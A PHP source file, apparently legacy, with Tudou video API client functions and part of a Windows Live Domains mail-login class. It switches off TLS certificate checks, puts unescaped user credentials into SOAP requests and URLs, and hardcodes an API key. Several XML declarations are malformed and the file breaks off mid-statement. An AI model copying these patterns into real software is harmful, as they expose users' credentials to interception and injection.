                        	$medialist[$i]['mediatype'] = iconv('utf-8','gb2312','rrrrrrrrrrrrrrr');
                        	$medialist[$i]['mediachecked'] = iconv('utf-8','gb2312','dddddddddddddddddddd');
	        	}
        	}       
        	else{   
        		//$objXml = new DOMDocument();  
        		//$objXml->preserveWhiteSpace = true;
        		//$objXml->async = false; 
        		//$objXml->loadXML($xmlstr);
        		//$objList = $objXml->getElementsByTagName("ItemInfo");   
	        	//echo $objList->length;                   
        		$medialist = array();
        		$medialist['page'] = iconv('utf-8','gb2312',$jsonstr['multiPageResult']['page']['pageNo']);
        		$medialist['pagesize'] = iconv('utf-8','gb2312',$jsonstr['multiPageResult']['page']['pageSize']);
        		$medialist['pagecount'] = iconv('utf-8','gb2312',$jsonstr['multiPageResult']['page']['pageCount']);
        		$medialist['totalcount'] = iconv('utf-8','gb2312',$jsonstr['multiPageResult']['page']['totalCount']);
        		$medialist['length'] = $medialist['totalcount'];
        		if ($medialist['length'] > $pagesize) $strpagesize = $pagesize; else $strpagesize = $medialist['length'];

 						for($i=0;$i<count(split("[|]",$this->forbidwords));$i++){
 											//PRINT_R(split("[|]",$this->forbidwords));
        							if(preg_replace("/(.*)([".strtolower(arrmember(split("[|]",$this->forbidwords),$i))."])(.*)/", "$2", strtolower(trim($keyword))) == strtolower(arrmember(split("[|]",$this->forbidwords),$i))){
        								$forbidflag = '1';
        								break;
        							}	
 						}	
 						if($forbidflag == '1'){
 											$medialist['forbidflag'] = '1';
        							return $medialist;  							
 						}	
 						else{
 											$medialist['forbidflag'] = '0';
 						}


        		for($i = 0;$i < $strpagesize;$i++){
                		//$objHdd = $objList->item($i);
                        	$medialist[$i]['itemCode'] = iconv('utf-8','gb2312',$jsonstr['multiPageResult']['results'][$i]['itemCode']);                		
                        	$medialist[$i]['mediatags'] = iconv('utf-8','gb2312',$jsonstr['multiPageResult']['results'][$i]['tags']);
                        	$medialist[$i]['mediatitle'] = iconv('utf-8','gb2312',$jsonstr['multiPageResult']['results'][$i]['title']);
                        	$medialist[$i]['mediadescription'] = iconv('utf-8','gb2312',$jsonstr['multiPageResult']['results'][$i]['description']);
                        	$medialist[$i]['mediapicurl'] = iconv('utf-8','gb2312',$jsonstr['multiPageResult']['results'][$i]['picUrl']);
                        	$medialist[$i]['mediatime'] = iconv('utf-8','gb2312',$jsonstr['multiPageResult']['results'][$i]['totalTime']);
                        	$medialist[$i]['mediacreatetime'] = iconv('utf-8','gb2312',$jsonstr['multiPageResult']['results'][$i]['pubDate']);
                        	$medialist[$i]['mediaownerid'] = iconv('utf-8','gb2312',$jsonstr['multiPageResult']['results'][$i]['ownerId']);
                        	$medialist[$i]['mediaownername'] = iconv('utf-8','gb2312',$jsonstr['multiPageResult']['results'][$i]['ownerName']);
                        	$medialist[$i]['mediaownernickname'] = iconv('utf-8','gb2312',$jsonstr['multiPageResult']['results'][$i]['ownerNickname']);
                        	$medialist[$i]['mediaclass'] = iconv('utf-8','gb2312',$jsonstr['multiPageResult']['results'][$i]['channelId']);
                        	$medialist[$i]['mediaplayerurl'] = iconv('utf-8','gb2312',$jsonstr['multiPageResult']['results'][$i]['outerPlayerUrl']);
                        	$medialist[$i]['mediaitemurl'] = iconv('utf-8','gb2312',$jsonstr['multiPageResult']['results'][$i]['itemUrl']);
                        	$medialist[$i]['mediatype'] = iconv('utf-8','gb2312',$jsonstr['multiPageResult']['results'][$i]['mediaType']);
                        	$medialist[$i]['mediachecked'] = iconv('utf-8','gb2312',$jsonstr['multiPageResult']['results'][$i]['isChecked']);
	        	}
		}
               	//print_r($medialist);
        	return $medialist;   
}

function tudoumediaulist($uname,$page,$pagesize){
        	if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
        		$jsonstr = '{"multiPageResult":{"results":[{"description":"hh","tags":"hh,X3193","itemId":90489503,"channelId":10,"mediaType":"ff","totalTime":57000,"pubDate":"2011-07-11","title":"ff","picUrl":"http://i4.tdimg.com/034/712/799/audio_120x90.jpg","itemUrl":"http://www.tudou.com/programs/view/3qNauyuUU7M/","itemCode":"3qNauyuUU7M","ownerName":"_58605774","ownerNickname":"X3193","outerPlayerUrl":"http://www.tudou.com/v/3qNauyuUU7M/v.swf","ownerId":58605774,"picChoiceUrl":["http://i4.tdimg.com/090/489/503/m15.jpg","http://i4.tdimg.com/090/489/503/m30.jpg"],"secret":false}],"page":{"totalCount":1,"pageSize":10,"pageNo":1,"pageCount":1}}}';
	               	$jsonstr = json_decode($jsonstr,true);
	               	//print_r($jsonstr);
        	}       
        	else{   
                	$ch = curl_init();
                	$url = "http://api.tudou.com/v3/gw?method=user.item.get&appKey=".$this->appKey."&format=json&user=".($uname)."&pageNo=".$page."&pageSize=".$pagesize;
                	curl_setopt($ch, CURLOPT_URL, $url);
                	curl_setopt($ch, CURLOPT_HEADER, 0);
                	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                	curl_setopt($ch, CURLOPT_TIMEOUT, 50000);
                	$jsonstr = '';
                	while($jsonstr == ''){
                		$jsonstr = curl_exec($ch);
                	}	
                	//print_r($jsonstr);
                	//return;
                	$jsonstr = json_decode($jsonstr,true);
                	curl_close($ch);
        	}

        	if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
        		$mediaulist = array();
        		$mediaulist['page'] = $page;
        		$mediaulist['pagesize'] = $pagesize;
        		$mediaulist['pagecount'] = '';
        		$mediaulist['totalcount'] = '100';
        		$mediaulist['length'] = $mediaulist['totalcount'];
        		if ($mediaulist['length'] > $pagesize) $strpagesize = $pagesize; else $strpagesize = $mediaulist['length'];        	

        		for($i = 0;$i < $strpagesize;$i++){
                		//$objHdd = $objList->item($i);
                        	$mediaulist[$i]['itemCode'] = iconv('utf-8','gb2312','aassssssssssss');                		
                        	$mediaulist[$i]['mediatags'] = iconv('utf-8','gb2312','aaaaaaaaaaaa');
                        	$mediaulist[$i]['mediatitle'] = iconv('utf-8','gb2312','bbbbbbbbbbbbbbb');
                        	$mediaulist[$i]['mediadescription'] = iconv('utf-8','gb2312','ccccccccccccccccc');
                        	$mediaulist[$i]['mediapicurl'] = iconv('utf-8','gb2312','hhhhhhhhhhhhhh');
                        	$mediaulist[$i]['mediatime'] = iconv('utf-8','gb2312','ggggggggggggggggg');
                        	$mediaulist[$i]['mediacreatetime'] = iconv('utf-8','gb2312','jjjjjjjjjjjjjj');
                        	$mediaulist[$i]['mediaownerid'] = iconv('utf-8','gb2312','kkkkkkkkkkkkkk');
                        	$mediaulist[$i]['mediaownername'] = iconv('utf-8','gb2312','mmmmmmmmmmmmmmmmm');
                        	$mediaulist[$i]['mediaownernickname'] = iconv('utf-8','gb2312','uuuuuuuuuuuuu');
                        	$mediaulist[$i]['mediaclass'] = iconv('utf-8','gb2312','oooooooooooo');
                        	$mediaulist[$i]['mediaplayerurl'] = iconv('utf-8','gb2312','ppppppppppp');
                        	$mediaulist[$i]['mediaitemurl'] = iconv('utf-8','gb2312','yyyyyyyyyyy');
                        	$mediaulist[$i]['mediaitemid'] = iconv('utf-8','gb2312','hhhhhhhhhhhhhhhhh');
                        	$mediaulist[$i]['mediaitemcode'] = iconv('utf-8','gb2312','hhhhhhhhhhhhhhhhhhh');
                        	$mediaulist[$i]['mediatype'] = iconv('utf-8','gb2312','rrrrrrrrrrrrrrr');
                        	$mediaulist[$i]['mediasecret'] = iconv('utf-8','gb2312','rrrrrrrrrrrrrrr');
	        	}
	        	//print_r($mediaulist);
        	}       
        	else{   
        		//$objXml = new DOMDocument();  
        		//$objXml->preserveWhiteSpace = true;
        		//$objXml->async = false; 
        		//$objXml->loadXML($xmlstr);
        		//$objList = $objXml->getElementsByTagName("ItemInfo");   
	        	//echo $objList->length;                   
        		$mediaulist = array();
        		$mediaulist['page'] = iconv('utf-8','gb2312',$jsonstr['multiPageResult']['page']['pageNo']);
        		$mediaulist['pagesize'] = iconv('utf-8','gb2312',$jsonstr['multiPageResult']['page']['pageSize']);
        		$mediaulist['pagecount'] = iconv('utf-8','gb2312',$jsonstr['multiPageResult']['page']['pageCount']);
        		$mediaulist['totalcount'] = iconv('utf-8','gb2312',$jsonstr['multiPageResult']['page']['totalCount']);
        		$mediaulist['length'] = $mediaulist['totalcount'];
        		if ($mediaulist['length'] > $pagesize) $strpagesize = $pagesize; else $strpagesize = $mediaulist['length'];        	

        		for($i = 0;$i < $strpagesize;$i++){
                		//$objHdd = $objList->item($i);
                        	$mediaulist[$i]['itemCode'] = iconv('utf-8','gb2312',$jsonstr['multiPageResult']['results'][$i]['itemCode']);                		
                        	$mediaulist[$i]['mediatags'] = iconv('utf-8','gb2312',$jsonstr['multiPageResult']['results'][$i]['tags']);
                        	$mediaulist[$i]['mediatitle'] = iconv('utf-8','gb2312',$jsonstr['multiPageResult']['results'][$i]['title']);
                        	$mediaulist[$i]['mediadescription'] = iconv('utf-8','gb2312',$jsonstr['multiPageResult']['results'][$i]['description']);
                        	$mediaulist[$i]['mediapicurl'] = iconv('utf-8','gb2312',$jsonstr['multiPageResult']['results'][$i]['picUrl']);
                        	$mediaulist[$i]['mediatime'] = iconv('utf-8','gb2312',$jsonstr['multiPageResult']['results'][$i]['totalTime']);
                        	$mediaulist[$i]['mediacreatetime'] = iconv('utf-8','gb2312',$jsonstr['multiPageResult']['results'][$i]['pubDate']);
                        	$mediaulist[$i]['mediaownerid'] = iconv('utf-8','gb2312',$jsonstr['multiPageResult']['results'][$i]['ownerId']);
                        	$mediaulist[$i]['mediaownername'] = iconv('utf-8','gb2312',$jsonstr['multiPageResult']['results'][$i]['ownerName']);
                        	$mediaulist[$i]['mediaownernickname'] = iconv('utf-8','gb2312',$jsonstr['multiPageResult']['results'][$i]['ownerNickname']);
                        	$mediaulist[$i]['mediaclass'] = iconv('utf-8','gb2312',$jsonstr['multiPageResult']['results'][$i]['channelId']);
                        	$mediaulist[$i]['mediaplayerurl'] = iconv('utf-8','gb2312',$jsonstr['multiPageResult']['results'][$i]['outerPlayerUrl']);
                        	$mediaulist[$i]['mediaitemurl'] = iconv('utf-8','gb2312',$jsonstr['multiPageResult']['results'][$i]['itemUrl']);
                        	$mediaulist[$i]['mediaitemid'] = iconv('utf-8','gb2312',$jsonstr['multiPageResult']['results'][$i]['itemId']);
                        	$mediaulist[$i]['mediaitemcode'] = iconv('utf-8','gb2312',$jsonstr['multiPageResult']['results'][$i]['itemCode']);
                        	$mediaulist[$i]['mediatype'] = iconv('utf-8','gb2312',$jsonstr['multiPageResult']['results'][$i]['mediaType']);
                        	$mediaulist[$i]['mediasecret'] = iconv('utf-8','gb2312',$jsonstr['multiPageResult']['results'][$i]['secret']);
	        	}
		}
               	//print_r($mediaulist);
        	return $mediaulist;   
}

function tudoumediaiteminfo($itemCodes){
        	if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
        		$jsonstr = '{"multiResult":{"results":[{"description":"test","tags":"test","alias":"","definition":0,"itemId":1000232,"ownerId":262809,"playTimes":233970,"title":"test","totalTime":20100,"pubDate":"2006-04-27","channelId":1,"bigPicUrl":"http://i1.tdimg.com/001/000/232/w.jpg","itemCode":"yg8CVootoAc","mediaType":"视频","downEnable":true,"picUrl":"http://i1.tdimg.com/001/000/232/p.jpg","itemUrl":"http://www.tudou.com/programs/view/yg8CVootoAc/","commentCount":9,"ownerName":"yumihhh","ownerNickname":"yumihhh","outerPlayerUrl":"http://www.tudou.com/v/yg8CVootoAc/v.swf","picChoiceUrl":["http://image2.tudou.com/data/imgs/i/001/000/232/m15.jpg","http://image2.tudou.com/data/imgs/i/001/000/232/m30.jpg"],"secret":false,"addPlaylistTime":""}]}}';
	               	$jsonstr = json_decode($jsonstr,true);
	               	//print_r($jsonstr);
        	}       
        	else{   
                	$ch = curl_init();
                	$url = "http://api.tudou.com/v3/gw?method=item.info.get&appKey=".$this->appKey."&format=json&itemCodes=".($itemCodes);
                	curl_setopt($ch, CURLOPT_URL, $url);
                	curl_setopt($ch, CURLOPT_HEADER, 0);
                	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                	curl_setopt($ch, CURLOPT_TIMEOUT, 50000);
                	$jsonstr = '';
                	while($jsonstr == ''){
                		$jsonstr = curl_exec($ch);
                	}	
                	//print_r($jsonstr);
                	//return;
                	$jsonstr = json_decode($jsonstr,true);
                	curl_close($ch);
                	//print_r($jsonstr);
                	//return;                	
        	}

        	if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
        		$mediainfo = array();
        		//$mediainfo['page'] = $page;
        		//$mediaulist['pagesize'] = $pagesize;
        		//$mediaulist['pagecount'] = '';
        		//$mediaulist['totalcount'] = '100';
        		//$mediaulist['length'] = $mediaulist['totalcount'];
        		//if ($mediaulist['length'] > $pagesize) $strpagesize = $pagesize; else $strpagesize = $mediaulist['length'];        	

        		//for($i = 0;$i < $strpagesize;$i++){
                		//$objHdd = $objList->item($i);
                        	$mediainfo['mediatags'] = iconv('utf-8','gb2312','aaaaaaaaaaaa');
                        	$mediainfo['mediatitle'] = iconv('utf-8','gb2312','bbbbbbbbbbbbbbb');
                        	$mediainfo['mediadescription'] = iconv('utf-8','gb2312','ccccccccccccccccc');
                        	$mediainfo['mediapicurl'] = iconv('utf-8','gb2312','hhhhhhhhhhhhhh');
                        	$mediainfo['mediatime'] = iconv('utf-8','gb2312','ggggggggggggggggg');
                        	$mediainfo['mediacreatetime'] = iconv('utf-8','gb2312','jjjjjjjjjjjjjj');
                        	$mediainfo['mediaownerid'] = iconv('utf-8','gb2312','kkkkkkkkkkkkkk');
                        	$mediainfo['mediaownername'] = iconv('utf-8','gb2312','mmmmmmmmmmmmmmmmm');
                        	$mediainfo['mediaownernickname'] = iconv('utf-8','gb2312','uuuuuuuuuuuuu');
                        	$mediainfo['mediaclass'] = iconv('utf-8','gb2312','oooooooooooo');
                        	$mediainfo['mediaplayerurl'] = iconv('utf-8','gb2312','ppppppppppp');
                        	$mediainfo['mediaitemurl'] = iconv('utf-8','gb2312','yyyyyyyyyyy');
                        	$mediainfo['mediaitemid'] = iconv('utf-8','gb2312','hhhhhhhhhhhhhhhhh');
                        	$mediainfo['mediaitemcode'] = iconv('utf-8','gb2312','hhhhhhhhhhhhhhhhhhh');
                        	$mediainfo['mediatype'] = iconv('utf-8','gb2312','rrrrrrrrrrrrrrr');
                        	$mediainfo['mediasecret'] = iconv('utf-8','gb2312','rrrrrrrrrrrrrrr');
	        	//}
	        	//print_r($mediaulist);
        	}       
        	else{   
        		//$objXml = new DOMDocument();  
        		//$objXml->preserveWhiteSpace = true;
        		//$objXml->async = false; 
        		//$objXml->loadXML($xmlstr);
        		//$objList = $objXml->getElementsByTagName("ItemInfo");   
	        	//echo $objList->length;                   
        		$mediainfo = array();
        		//$mediainfo['page'] = iconv('utf-8','gb2312',$jsonstr['multiPageResult']['page']['pageNo']);
        		//$mediainfo['pagesize'] = iconv('utf-8','gb2312',$jsonstr['multiPageResult']['page']['pageSize']);
        		//$mediainfo['pagecount'] = iconv('utf-8','gb2312',$jsonstr['multiPageResult']['page']['pageCount']);
        		//$mediainfo['totalcount'] = iconv('utf-8','gb2312',$jsonstr['multiPageResult']['page']['totalCount']);
        		//$mediainfo['length'] = $mediainfo['totalcount'];
        		//if ($mediainfo['length'] > $pagesize) $strpagesize = $pagesize; else $strpagesize = $mediainfo['length'];        	

        		//for($i = 0;$i < $strpagesize;$i++){
                		//$objHdd = $objList->item($i);
                        	$mediainfo['mediatags'] = iconv('utf-8','gb2312',$jsonstr['multiResult']['results'][0]['tags']);
                        	$mediainfo['mediatitle'] = iconv('utf-8','gb2312',$jsonstr['multiResult']['results'][0]['title']);
                        	$mediainfo['mediadescription'] = iconv('utf-8','gb2312',$jsonstr['multiResult']['results'][0]['description']);
                        	$mediainfo['mediapicurl'] = iconv('utf-8','gb2312',$jsonstr['multiResult']['results'][0]['picUrl']);
                        	$mediainfo['mediatime'] = iconv('utf-8','gb2312',$jsonstr['multiResult']['results'][0]['totalTime']);
                        	$mediainfo['mediacreatetime'] = iconv('utf-8','gb2312',$jsonstr['multiResult']['results'][0]['pubDate']);
                        	$mediainfo['mediaownerid'] = iconv('utf-8','gb2312',$jsonstr['multiResult']['results'][0]['ownerId']);
                        	$mediainfo['mediaownername'] = iconv('utf-8','gb2312',$jsonstr['multiResult']['results'][0]['ownerName']);
                        	$mediainfo['mediaownernickname'] = iconv('utf-8','gb2312',$jsonstr['multiResult']['results'][0]['ownerNickname']);
                        	$mediainfo['mediaclass'] = iconv('utf-8','gb2312',$jsonstr['multiResult']['results'][0]['channelId']);
                        	$mediainfo['mediaplayerurl'] = iconv('utf-8','gb2312',$jsonstr['multiResult']['results'][0]['outerPlayerUrl']);
                        	$mediainfo['mediaitemurl'] = iconv('utf-8','gb2312',$jsonstr['multiResult']['results'][0]['itemUrl']);
                        	$mediainfo['mediaitemid'] = iconv('utf-8','gb2312',$jsonstr['multiResult']['results'][0]['itemId']);
                        	$mediainfo['mediaitemcode'] = iconv('utf-8','gb2312',$jsonstr['multiResult']['results'][0]['itemCode']);
                        	$mediainfo['mediatype'] = iconv('utf-8','gb2312',$jsonstr['multiResult']['results'][0]['mediaType']);
                        	$mediainfo['mediasecret'] = iconv('utf-8','gb2312',$jsonstr['multiResult']['results'][0]['secret']);
	        	//}
					}
          //print_r($mediainfo);
        	return $mediainfo;   
        	
}

function tudoumediaupload($uname,$pwd,$content,$tags,$title,$channelId,$file){
          $url = "http://api.tudou.com/v3/gw?method=item.upload&appKey=5522b8d49cf7bfd9&content=".encodeuri(iconv('gb2312','utf-8',$content))."&tags=".encodeuri(iconv('gb2312','utf-8',$tags))."&channelId=".trim($channelId)."&title=".encodeuri(iconv('gb2312','utf-8',$title)); 
          $postdata = '';
          $header[] = "Content-type: application/json; charset=utf-8";
          $header[] = "Content-length: ".strlen($postdata);
          $ch = curl_init();
          curl_setopt($ch, CURLOPT_URL, $url);
          curl_setopt($ch, CURLOPT_HEADER, 0);
          curl_setopt($ch, CURLOPT_CUSTOMREQUEST,'POST');
          curl_setopt($ch, CURLOPT_USERPWD, $uname.':'.$pwd);
          curl_setopt($ch, CURLOPT_HTTPHEADER, $header);                  
          curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
          curl_setopt($ch, CURLOPT_TIMEOUT, 10000);
          curl_setopt($ch, CURLOPT_POST, 1);
          curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
          $jsonstr = curl_exec($ch);
          $jsoncode = curl_getinfo($ch,CURLINFO_HTTP_CODE);
          curl_close($ch);
          //print_r($uname.':'.$pwd);
          $jsonarray = json_decode($jsonstr,true);
         	$url = $jsonarray['itemUploadInfo']['uploadUrl']; 
         	$filename = time()."_".basename($file['mediapath']['name']);//.'_'.time().'.'.geturlinfo(httppathdir()."/tmp/".basename($_FILES['mediapath']['name']),"ext");
         	copy($file['mediapath']['tmp_name'], "./tmp/".$filename);
          //$ch = curl_init();
          //curl_setopt($ch, CURLOPT_URL, trim(httppathdir()."/tmp/".$filename));
          //curl_setopt($ch, CURLOPT_HEADER, 0);
          //curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
          //curl_setopt($ch, CURLOPT_BINARYTRANSFER, 1);
          //curl_setopt($ch, CURLOPT_TIMEOUT, 10000);
          //$xmlstr = curl_exec($ch);
                    //echo $xmlstr;          
          //curl_close($ch);         	
 					$postdata = array(
													"file"  => "@"."tmp/".$filename
												);
         	$header[] = "Content-type: application/x-www-form-urlencoded";
         	$header[] = "Content-length: ".strlen($postdata);
         	//$header[] = $postdata;

         	$ch = curl_init();
         	curl_setopt($ch, CURLOPT_URL, $url);
         	curl_setopt($ch, CURLOPT_HEADER, 0);
         	//curl_setopt($ch, CURLOPT_CUSTOMREQUEST,'POST');
         	//curl_setopt($ch, CURLOPT_HTTPHEADER, $header);    
         	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
         	curl_setopt($ch, CURLOPT_TIMEOUT, 150);
         	curl_setopt($ch, CURLOPT_POST, 1);
         	curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
         	$jsonstr = curl_exec($ch);
         	curl_close($ch);
		        
        	$pathinfo = parse_url(trim(httppathdir()."/tmp/".$filename));
        	if($pathinfo['host'] == $_SERVER['SERVER_NAME'])
               		//unlink('./tmp/'.geturlinfo(trim(httppathdir()."/tmp/".$filename),"filename"));

					//$jsonstr = '{"files":[{"storePath":"\/tudou\/2\/web_up\/110711\/58605774_64.120.224.50_BDdDZ6PcaXHF6RuTzy7OaTJfL8nY0Hyj","name":"BladeDSCampaign.mp3","md5":"06857fb42bd238ad8fdcf419d456d9ba","contentType":"application\/octet-stream","size":920219}],"fields":[]}';
        	//print_r($filename);
        	$jsonstr = json_decode($jsonstr,true);
               		
					return $jsonstr;
}

}

?>

<?php 

// ---------------------------------------------------
//  Domains.live.com - X3193邮箱系统非标准独立类 v1.1
//  供能：实现Domains.live.com下自定义域名的邮箱服务
//  实现：X3193API
//  供应：live.com
//  收藏：☆☆☆☆☆
//  时间：2011-06-08 12:53AM
//  行数：683行
// ---------------------------------------------------
//  更新日志：
// ---------------------------------------------------

class live_class{

// ---------------------------------------------------
//  返回内容：$AuthData 返回格式：字符串
// ---------------------------------------------------

function liveauthdatalogin($username,$userpwd){

        // ----------------------------
        // GetLoginUrl
        // ----------------------------

        if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
                $xmlstr = '<?php xml version="1.0" encoding="utf-8"?>'.
                                '<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">'.
                                '<soap:Body>'.
                                '<GetLoginUrlResponse xmlns="http://domains.live.com/Service/ManageDomain/V1.0">'.
                                '<GetLoginUrlResult>string</GetLoginUrlResult>'.
                                '</GetLoginUrlResponse>'.
                                '</soap:Body>'.
                                '</soap:Envelope>';
        }       
        else{   
                $SoapRequest = "<?php xml version='1.0' encoding='utf-8'?>".
                                "<soap:Envelope xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance' xmlns:xsd='http://www.w3.org/2001/XMLSchema' xmlns:soap='http://schemas.xmlsoap.org/soap/envelope/'>".
                                "<soap:Body>".
                                "<GetLoginUrl xmlns='http://domains.live.com/Service/ManageDomain/V1.0'>".
                                "<memberNameIn>".$username."</memberNameIn>".
                                "</GetLoginUrl>".
                                "</soap:Body>".
                                "</soap:Envelope>";
                $header = array(
                                'SOAPAction:http://domains.live.com/Service/ManageDomain/V1.0/GetLoginUrl',
                                'Content-Type: text/xml; charset=utf-8',
                                'Content-length: '.strlen($SoapRequest),
                                'Host: domains.live.com'
                );
        
                $url = "https://domains.live.com/service/managedomain2.asmx";
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $url);
                curl_setopt($ch, CURLOPT_HEADER, 0);
                curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_CUSTOMREQUEST,'POST');
                curl_setopt($ch, CURLOPT_POSTFIELDS, $SoapRequest);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
                curl_setopt($ch, CURLOPT_TIMEOUT, 150);
                $xmlstr = curl_exec($ch);
                $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                curl_close($ch);
        }
        $objXml = new DOMDocument();  
        $objXml->preserveWhiteSpace = true;
        $objXml->async = false; 
        $objXml->loadXML($xmlstr);
        $loginurl = $objXml->getElementsByTagName("GetLoginUrlResult")->item(0)->nodeValue;

        // ----------------------------
        // GetLoginDataTemplate
        // ----------------------------

        if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
                $xmlstr = '<?php xml version="1.0" encoding="utf-8"?>'.
                                '<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">'.
                                '<soap:Body>'.
                                '<GetLoginDataTemplateResponse xmlns="http://domains.live.com/Service/ManageDomain/V1.0">'.
                                '<GetLoginDataTemplateResult>string</GetLoginDataTemplateResult>'.
                                '</GetLoginDataTemplateResponse>'.
                                '</soap:Body>'.
                                '</soap:Envelope>';
        }       
        else{   
                $SoapRequest = "<?php xml version='1.0' encoding='utf-8'?>".
                                "<soap:Envelope xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance' xmlns:xsd='http://www.w3.org/2001/XMLSchema' xmlns:soap='http://schemas.xmlsoap.org/soap/envelope/'>".
                                "<soap:Body>".
                                "<GetLoginDataTemplate xmlns='http://domains.live.com/Service/ManageDomain/V1.0' />".
                                "</soap:Body>".
                                "</soap:Envelope>";
                $url = "https://domains.live.com/service/managedomain2.asmx";
                $header = array(
                                'SOAPAction:http://domains.live.com/Service/ManageDomain/V1.0/GetLoginDataTemplate',
                                'Content-Type: text/xml; charset=utf-8',
                                'Content-length: '.strlen($SoapRequest),
                                'Host: domains.live.com'
                );      
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $url);
                curl_setopt($ch, CURLOPT_HEADER, 0);
                curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_CUSTOMREQUEST,'POST');
                curl_setopt($ch, CURLOPT_POSTFIELDS, $SoapRequest);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
                curl_setopt($ch, CURLOPT_TIMEOUT, 150);
                $xmlstr = curl_exec($ch);
                curl_close($ch);
        }       
        $objXml = new DOMDocument();  
        $objXml->preserveWhiteSpace = true;
        $objXml->async = false; 
        $objXml->loadXML($xmlstr);
        $GetLoginDataTemplateResult = $objXml->getElementsByTagName("GetLoginDataTemplateResult")->item(0)->nodeValue;
        $GetLoginData = str_replace("%NAME%", $username, $GetLoginDataTemplateResult);
        $GetLoginData = str_replace("%PASSWORD%", $userpwd, $GetLoginData);
        
        // ----------------------------
        // Login
        // ----------------------------

        if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
                $xmlstr = 'https://domains.live.com/default.aspx?did=1&t=EwAAAhAnAAAUWkziSC7RbDJKS1VkhugDegv7L0eAAIZwABr9Smt5sntFDvfzRlmH5TYfbaz6/xvLMhwlHA5AKPg1kSd6bzOG4zcpD2xufra8DsxbixILT83992lVAlbfKyYqXdhcwyGQiJb7vngZwLM0o7o4/Fp5rPmg3aZvqX2kQ7qZ34Qf2bpuSuBxdY%2b/bZl/qj6IGGLgX1ZNLMwaA2YAAAgEWnGZNlbRKFABY%2b/uox28TOhrGkciPD/kJtU2wnBzA2J2HuDb0jYJYb8Mg5XPptp6rJuGu3tDx400ll5KV8D3N/BoxepGkML/9icQyh9oOmKhZm4o59GFDep8YqJS6GGapWOhjQJ5YNNIXIx9XDMVWsh5poZx/VMdJtcKj1ByTg8gWLO4R18wCEazzVWmI0SCGl6kHtMysnHilwYOe/xlSXubdTgRG0tJfr0XOHXG0NQNW0QvnJxsIjBvhVhj1u3Ywt6ka0opubUiOzytgs9Wc4k4xsVdICXSiOIv%2bgLtNukXtJtD5Boe8tCageQ00Uc%2b%2butvvLccP9gOuBE25xrnl/Tckq0OgGlTyLRtEDUSHCJCUOiDMNBqi5UZWsHUuxaSRW1dUrad1lRgedEsrzUtkMxghwLDpZ82WQecCH5pR8P2Xb1ZlZrYDxPYiCbGvqK0t5WGHgJB%2bRDBaAE%3d&mkt=EN-US&lc=1033&id=66055';
        }       
        else{   
                $ch = curl_init();
                $SoapRequest = $GetLoginData;
                $url = $loginurl;
                $header = array(
                                'Content-Type: text/xml; charset=utf-8',
                                'Content-length: '.strlen($SoapRequest),
                );      
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $url);
                curl_setopt($ch, CURLOPT_HEADER, 0);
                curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_CUSTOMREQUEST,'POST');
                curl_setopt($ch, CURLOPT_POSTFIELDS, $SoapRequest);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
                curl_setopt($ch, CURLOPT_TIMEOUT, 150);
                $xmlstr = curl_exec($ch);
                curl_close($ch);
        }       
        $AuthData = $xmlstr;
        $AuthData = str_replace(chr(13), "", $AuthData);
        $AuthData = str_replace(chr(10), "", $AuthData);
        $AuthData = trim($AuthData);
        return $AuthData;
}

// ---------------------------------------------------
//  返回内容：true or false 返回格式：bool
// ---------------------------------------------------

function livetestconnect($AuthData,$username,$userpwd){

        // ----------------------------
        // TestConnection
        // ----------------------------
                
        if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
                $xmlstr = '<?php xml version="1.0" encoding="utf-8"<div></div>?>'.
